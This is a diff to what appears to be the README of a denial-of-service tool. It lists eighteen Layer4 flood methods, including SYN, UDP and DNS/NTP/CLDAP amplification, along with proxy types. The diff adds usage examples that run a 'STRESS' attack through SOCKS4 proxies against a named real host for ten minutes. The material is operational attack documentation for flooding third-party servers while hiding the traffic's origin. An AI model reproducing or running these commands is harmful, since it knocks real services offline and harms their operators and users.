@@ -8,6 +8,7 @@ Note: If the Proxy list is empty, the attack will run without proxies
          - 4 = SOCKS4
          - 1 = HTTP
          - 0 = ALL
+Script can use ports: 1-65535
  > Methods:
  - Layer4
  | UDP, MINECRAFT, ARD, CPS, TS3, FIVEM, CLDAP, MEM, DNS, MCBOT, TCP, SYN, CONNECTION, RDP, NTP, CHAR, VSE, MCPE | 18 Methods
@@ -35,3 +36,6 @@ python3 start.py STRESS http://test2.lug.in.ua 0 2 0_proxies_list.txt 100 3600
 # list af checked proxies will be saved in files/proxies/0_proxies_list.txt
 python3 start.py STRESS http://test2.lug.in.ua 1 2 0_proxies_list.txt 10 600 true
 
+# stress attack using SOCKS4 proxies that were recieved from API's,
+# list af checked proxies will be saved in files/proxies/0_proxies_list.txt
+python3 start.py STRESS http://test2.lug.in.ua 4 2 0_proxies_list.txt 10 600 true
